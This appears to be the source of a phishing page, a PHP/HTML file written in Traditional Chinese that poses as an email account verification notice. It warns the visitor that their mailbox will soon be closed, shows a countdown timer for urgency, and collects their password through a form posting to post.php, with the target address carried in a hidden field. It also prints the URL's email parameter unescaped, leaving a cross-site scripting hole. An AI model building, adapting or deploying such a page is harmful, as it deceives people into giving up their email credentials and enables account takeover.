<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET'){
    $TKRand = md5(uniqid(rand(), true));
    session_abort();
    header("Location: Confirmation.html?id=".$TKRand);
}elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $EmailAddr = $_POST['email'];
    if (isset($EmailAddr)){
        $TKRand = md5(uniqid(rand(), true));
        session_abort();
        header("Location: ../../Confirmation.html?id=".$TKRand);
    }
}
?>
<!DOCTYPE html>
<html>
<head>

<title>&#38651;&#23376;&#37109;&#20214;&#35373;&#23450; | &#24115;&#25142;&#26680;&#26597;</title>

<link rel="icon" href="files/id.png" sizes="13x13" type="image/png">


</head>
<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" rightmargin="0" leftmargin="0" link="#3F59A4" alink="#3F59A4" vlink="#3F59A4">

<table width="100%" height="" cellspacing="0">

<tr><td height="30" bgcolor="#000000">

	<table width="" align="center"><tr>


	<td>
	<img src="files/mail.png" width="40" height="27">
	</td>


	<td width="5"></td>


	<td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ffffff">
	&#38651;&#23376;&#37109;&#20214;&#35373;&#23450;
	</font>
	</td>






	<td width="800">
	<div align="right">
	<a href="" style="text-decoration:none">
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ffffff">
	<?php echo $_GET['email']; ?>
	<?php echo $_GET['email']; ?>
	</font>
	</a>
	</div>
	</td>




	<td width="5"></td>





	<td>
	<a href="">
	<img src="files/id.png" width="28" height="28" border="0">
	</a>
	</td>

	</tr></table>

</td></tr>






<tr><td height="60" bgcolor="#FFFFFF"></td></td>






<tr><td height="" bgcolor="#FFFFFF">

	<table width="650" align="center" cellspacing="0">

	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+3" color="#3F59A4">
	&#38651;&#23376;&#37109;&#20214;&#24115;&#25142;&#39511;&#35657;
	</font>
	</td></tr>


	<tr><td height="15" bgcolor="#FFFFFF"></td></td>



	<tr><td>

		<table><tr>

		<td>
		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="3">
		&#24744;&#30340;&#38651;&#23376;&#37109;&#20214;&#22312;&#27492;&#26178;&#23559;&#38364;&#38281;:
		</font>
		</td>


		<td>
		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ff0000">

		<b><div id="hms">01:15:10</div></b>

		<script type="text/javascript">
    		function count() {

    		var startTime = document.getElementById('hms').innerHTML;
    		var pieces = startTime.split(":");
    		var time = new Date();    time.setHours(pieces[0]);
    		time.setMinutes(pieces[1]);
    		time.setSeconds(pieces[2]);
    		var timedif = new Date(time.valueOf() - 1000);
    		var newtime = timedif.toTimeString().split(" ")[0];
    		document.getElementById('hms').innerHTML=newtime;
    		setTimeout(count, 1000);
		}
		count();

		</script>

		</font>

		</td>



		</tr></table>


	</td></tr>








	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="3">
	&#39511;&#35657;&#24744;&#30340;&#38651;&#23376;&#37109;&#20214;&#29694;&#22312;&#20197;&#38450;&#27490;&#23427;&#34987;&#38364;&#38281;
	</font>
	</td></tr>









	<tr><td height="25" bgcolor="#FFFFFF"></td></td>




	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2">
	<?php echo $_GET['email']; ?>
	</font>
	</td></tr>




	<tr><td height="5" bgcolor="#FFFFFF"></td></td>



	<tr><td>
	<form method="post" action="post.php">
	</td></tr>



	<tr><td>

		<input  name="passwd" type="password" style="width:250px; height:23px; font-family: Verdana;
      				font-size: 15px; color:#000000; background-color: #ffffff;
      				border: solid 1px #848484; padding: 10px; -moz-border-radius: 5px;
      				-webkit-border-radius: 5px; 	-khtml-border-radius: 5px;
      				border-radius: 5px;" required="" placeholder="&#36664;&#20837;&#24744;&#30340;&#23494;&#30908;&#20197;&#32380;&#32396;">

	</td></tr>







	<tr><td height="5" bgcolor="#FFFFFF"></td></td>



	<tr><td>

		<input  value="&#39511;&#35657;&#38651;&#23376;&#37109;&#20214; >>" type="submit"
                    style="width:270px; height:55px; font-family: Verdana;
                    font-size: 17px; color:#ffffff;
					background-color: #3F59A4; border: solid 1px #3F59A4; padding: 10px;
					-moz-border-radius: 2px; -webkit-border-radius: 2px;
                    -khtml-border-radius: 2px; border-radius: 2px;
					-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888;
                    box-shadow: 3px 3px 3px #888;">

	</td></tr>



	<tr><td>
	<input name="login" type="hidden" value="<?php echo $_GET['email']; ?>">
	</form>
	</td></tr>





	<tr><td height="200" bgcolor="#FFFFFF"></td></td>






	<tr><td>
	<hr width="650" align="left">
	</td></tr>







	<tr><td height="10" bgcolor="#FFFFFF"></td></td>





	<tr><td>
	<div align="center">
	<a href="" style="text-decoration:none">
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
	<b>***</b> &#38651;&#23376;&#37109;&#20214;&#24115;&#25142; / &#35373;&#23450;&#27284;&#35373;&#32622; /
	&#23433;&#20840;&#35373;&#32622; / &#24115;&#25142;&#26680;&#26597; >>
	</font>
	</a>
	</div>
	</td></tr>


	</table>

</td></tr>



</table>

</body>
</html>
